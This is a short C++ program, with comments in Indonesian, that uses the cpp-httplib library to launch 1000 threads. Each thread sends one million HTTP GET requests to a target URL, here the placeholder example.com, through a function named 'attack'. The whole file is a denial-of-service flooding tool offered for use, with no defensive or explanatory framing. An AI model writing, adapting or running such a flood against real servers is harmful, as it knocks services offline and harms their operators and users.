#include <httplib.h>
#include <thread>
#include <atomic>

std::atomic<long> success_count(0);

void attack(const std::string &url, int requests_per_thread) {
    httplib::Client client(url);
    for (int i = 0; i < requests_per_thread; i++) {
        if (client.Get("/")) success_count++;
    }
}

int main() {
    std::string target_url = "https://example.com";
    int thread_count = 1000;  // Sesuaikan
    int requests_per_thread = 1000000; // 1 juta/thread

    std::vector<std::thread> threads;
    for (int i = 0; i < thread_count; i++) {
        threads.emplace_back(attack, target_url, requests_per_thread);
    }

    for (auto &t : threads) {
        t.join();
    }

    std::cout << "Total requests: " << success_count << std::endl;
}